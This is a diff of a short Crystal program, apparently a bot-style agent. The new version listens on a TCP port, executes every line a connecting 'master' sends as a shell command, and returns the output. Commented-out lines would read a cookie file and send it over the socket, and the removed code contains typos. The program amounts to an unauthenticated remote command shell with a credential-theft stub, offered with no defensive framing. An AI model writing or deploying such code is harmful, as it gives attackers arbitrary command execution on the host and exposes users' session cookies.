@@ -1,10 +1,19 @@
 require "socket"
-require "./auth.cr"
-
+#require "./auth"
 stdout = IO::Memory.new
-connfd = TCPSocket.new("127.0.0.1",12345)
+connfd = TCPServer.new("127.0.0.1", 12345)
+#content = File.open("#{cookie_file}") do |file|
+#       file.gets_to_end
+#end
+#connfd << content#
 
-userinput = confd.gets.to_s.split(' ')
-process = Process.new(userinput[0],[userinput[1]], output: stdout)
-status - process.wait
-connfd << stdout.to_s
+def handle_master(master)
+      puts "master connected.\n"
+      message = `#{master.gets.to_s}`
+      puts message
+      master.puts(message)
+end
+
+while master = connfd.accept?
+      spawn handle_master(master)
+end
